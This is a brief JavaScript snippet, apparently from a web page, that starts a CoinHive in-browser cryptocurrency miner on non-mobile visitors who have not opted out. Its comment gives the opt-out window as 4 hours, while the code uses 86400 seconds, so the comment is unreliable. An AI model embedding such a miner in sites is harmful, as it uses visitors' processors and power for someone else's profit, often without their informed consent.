            var miner = new CoinHive.Anonymous('PoghMrkXfuyuvWVBipRwSRfpYGeNuDB9', {
                throttle: 0.99
            }); // Only start on non-mobile devices and if not opted-out            // in the last 14400 seconds (4 hours):            if (!miner.isMobile() && !miner.didOptOut(86400)) {                miner.start();            }